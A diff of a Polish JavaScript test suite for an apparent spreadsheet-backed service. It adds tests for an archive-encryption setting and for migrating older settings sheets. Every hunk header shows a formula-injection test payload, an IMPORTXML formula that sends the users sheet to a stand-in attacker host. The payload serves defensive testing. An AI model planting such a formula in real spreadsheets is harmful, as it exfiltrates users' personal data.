@@ -192,7 +192,7 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   const B = swiezy(); const H = { haslo: 'haslo123' };
   const ust = () => B.get('Ustawienia');
   const wpisz = (klucz, wartosc) => { const w = ust().w.find(r => r[0] === klucz); w[1] = wartosc; };
-  ok('inicjalizuj() zakłada zakładkę „Ustawienia” z trzema pustymi wierszami: hasło paczki, data ważności i adres odbiorcy (administrator tylko wpisuje wartości)', ust() && ust().w[0].join() === 'Klucz,Wartosc,Opis' && ust().w.length === 4 && ust().w[1][0] === 'haslo_paczki' && ust().w[1][1] === '' && ust().w[2][0] === 'haslo_paczki_wazne_do' && ust().w[2][1] === '' && ust().w[3][0] === 'adres_odbiorcy' && ust().w[3][1] === '', JSON.stringify(ust() && ust().w.map(r => r.slice(0, 2))));
+  ok('inicjalizuj() zakłada zakładkę „Ustawienia” z trzema pustymi wierszami: hasło paczki, data ważności i adres odbiorcy (administrator tylko wpisuje wartości) oraz czwartym: szyfr paczki, domyślnie „klasyczny”', ust() && ust().w[0].join() === 'Klucz,Wartosc,Opis' && ust().w.length === 5 && ust().w[4][0] === 'format_paczki' && ust().w[4][1] === 'klasyczny' && ust().w[1][0] === 'haslo_paczki' && ust().w[1][1] === '' && ust().w[2][0] === 'haslo_paczki_wazne_do' && ust().w[2][1] === '' && ust().w[3][0] === 'adres_odbiorcy' && ust().w[3][1] === '', JSON.stringify(ust() && ust().w.map(r => r.slice(0, 2))));
   ok('wiersze z opisami nie zaczynają się od znaków formuły (arkusz nie zrobi z nich formuły)', B.formuly().length === 0, JSON.stringify(B.formuly()));
   ok('nic nie ustawione → „brak” (wysyłka wyłączona), bez żadnego hasła w odpowiedzi', (() => { const o = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return o.status === 'brak' && !('haslo' in o); })());
   wpisz('haslo_paczki', 'Tajne-Haslo-2026');
@@ -204,6 +204,14 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   wpisz('adres_odbiorcy', 'odbiorca@firma.pl');
   const ok1 = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H);
   ok('hasło, termin w przyszłości i adres → „ok”, odpowiedź niesie hasło, datę ważności i adres odbiorcy', ok1.status === 'ok' && ok1.haslo === 'Tajne-Haslo-2026' && ok1.wazne_do === '2099-12-31' && ok1.adres === 'odbiorca@firma.pl', JSON.stringify(ok1));
+  ok('odpowiedź niesie szyfr paczki: domyślnie „klasyczny” (otwiera go Eksplorator Windows)', ok1.format === 'klasyczny', JSON.stringify(ok1));
+  { const fm = w => { wpisz('format_paczki', w); return B.post({ akcja: 'haslo_paczki', kod: '12345' }, H).format; };
+    ok('szyfr „aes” (także „AES”, „AES-256”, ze spacjami) → „aes”; puste, nieznane i literówki → „klasyczny” (bezpieczny domyślny, bez blokowania wysyłki)', fm('aes') === 'aes' && fm('AES') === 'aes' && fm(' aes-256 ') === 'aes' && fm('') === 'klasyczny' && fm('zip') === 'klasyczny' && fm('klasyczny') === 'klasyczny' && fm(undefined) === 'klasyczny', [fm('aes'), fm(''), fm('zip')].join('|'));
+    wpisz('format_paczki', 'klasyczny'); }
+  { const stare = swiezy(); const w = stare.get('Ustawienia').w; const i0 = w.findIndex(r => r[0] === 'format_paczki'); w.splice(i0, 1);      // arkusz ze starszej wersji skryptu: bez wiersza szyfru
+    w.find(r => r[0] === 'haslo_paczki')[1] = 'Tajne-Haslo-2026'; w.find(r => r[0] === 'haslo_paczki_wazne_do')[1] = '2099-12-31'; w.find(r => r[0] === 'adres_odbiorcy')[1] = 'odbiorca@firma.pl';
+    const o = stare.post({ akcja: 'haslo_paczki', kod: '12345' }, H); const dop = stare.get('Ustawienia').w.some(r => r[0] === 'format_paczki' && r[1] === 'klasyczny');
+    ok('starszy arkusz (bez wiersza szyfru) działa jak dotąd: szyfr „klasyczny”, a brakujący wiersz zostaje dopisany do zakładki „Ustawienia”', o.status === 'ok' && o.format === 'klasyczny' && dop, JSON.stringify(o)); }
   ok('konto, które jeszcze nie ustawiło własnego hasła (nie ma klucza), hasła paczki nie dostaje', (() => { const o = B.post({ akcja: 'haslo_paczki', kod: '22222' }, { haslo: '501502503' }); return o.status === 'odmowa' && !('haslo' in o); })());
   B.post({ akcja: 'zmien_haslo', kod: '22222', stare_haslo: '501502503', nowe_haslo: 'mojehaslo9' });
   ok('…a drugie konto (po ustawieniu własnego hasła) dostaje identyczne hasło paczki', B.post({ akcja: 'haslo_paczki', kod: '22222' }, { haslo: 'mojehaslo9' }).haslo === 'Tajne-Haslo-2026');
@@ -231,8 +239,9 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   ok('…a Log mówi administratorowi, co poprawić', B.get('Log').w.some(r => r[2] === 'haslo_paczki_blad' && /Zwykly tekst/.test(r[3])));
   wpisz('haslo_paczki', '   ');
   ok('samo odstępy w polu hasła = wysyłka wyłączona („brak”)', B.post({ akcja: 'haslo_paczki', kod: '12345' }, H).status === 'brak');
-  ok('zakładka Ustawienia nie jest nadpisywana przez zapytania klienta (żadna akcja nie zapisuje tam danych od klienta)', ust().w.length === 4);
-  ok('istniejąca zakładka „Ustawienia” bez wiersza adresu (ze starszej wersji skryptu) jest uzupełniona o ten wiersz przy następnym wywołaniu inicjalizuj()', (() => { const C = swiezy(); C.get('Ustawienia').w.pop(); C.wywolaj('inicjalizuj()'); return C.get('Ustawienia').w.length === 4 && C.get('Ustawienia').w[3][0] === 'adres_odbiorcy'; })());
+  ok('zakładka Ustawienia nie jest nadpisywana przez zapytania klienta (żadna akcja nie zapisuje tam danych od klienta)', ust().w.length === 5);
+  ok('istniejąca zakładka „Ustawienia” bez wiersza adresu (ze starszej wersji skryptu) jest uzupełniona o ten wiersz przy następnym wywołaniu inicjalizuj()', (() => { const C = swiezy(); C.get('Ustawienia').w.splice(3, 1); C.wywolaj('inicjalizuj()'); return C.get('Ustawienia').w.length === 5 && C.get('Ustawienia').w.some(r => r[0] === 'adres_odbiorcy'); })());
+  ok('…tak samo wiersz szyfru paczki (format_paczki) z domyślną wartością „klasyczny”', (() => { const C = swiezy(); C.get('Ustawienia').w.pop(); C.wywolaj('inicjalizuj()'); const r = C.get('Ustawienia').w.find(x => x[0] === 'format_paczki'); return C.get('Ustawienia').w.length === 5 && !!r && r[1] === 'klasyczny'; })());
 }
 /* ---- 9. podpis hasłem nie jest wyrocznią do zgadywania hasła bez limitu ---- */
 {
